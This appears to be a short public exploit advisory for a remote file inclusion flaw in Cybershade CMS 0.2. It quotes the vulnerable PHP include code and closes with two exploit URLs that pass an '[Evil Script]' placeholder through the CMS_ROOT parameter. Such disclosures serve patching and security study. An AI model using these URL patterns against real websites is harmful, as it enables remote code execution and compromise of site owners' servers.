@@ -1,0 +1,30 @@
+###################### Author: #############################
+Author: Mr.SeCreT
+E-mail: g-ff@hotmail.com<mailto:g-ff@hotmail.com>
+From: Syria
+<http://english.islamweb.net/>############## Script Information: #########################
+Script: Cybershade CMS 0.2 Remote File Inclusion Vulnerability
+Language: PHP
+Download: http://sourceforge.net/projects/cybershadecms/files/cybershadecms/0.2b-DEV/cybershade_0.2b-DEV.zip/download
+################### Vul Code: ##############################
+core.php:
+<?php
+session_start();
+error_reporting (E_ERROR | E_WARNING | E_PARSE); //this will be set to 0 when released, this is to stop any error's showing up
+//error_reporting (0);
+include $CMS_ROOT."core/base_functions.php"; //functions that the CMS will use
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+includes.php:
+<?php
+//This file has the main includes all in one file, this will enable us to change the files if we need to
+include "xconnect.php"; //connection infomation
+include $CMS_ROOT."core/core.php"; //main core of the CMS
+include $CMS_ROOT."core/security.php"; //CMS security
+include $CMS_ROOT."core/menus.php"; //Menus
+include $CMS_ROOT."core/classes.php"; //Diffrent Classes
+//include $CMS_ROOT."core/bbcode.php"; //bbcodes
+template(); //call upon the template function
+?>
+################### Exploit: ###############################
+www.site.com/path/core/core.php?CMS_ROOT=[Evil<http://www.site.com/path/core/core.php?CMS_ROOT=[Evil> Script]
+www.site.com/path/core/includes.php?CMS_ROOT=[Evil<http://www.site.com/path/core/includes.php?CMS_ROOT=[Evil> Script]
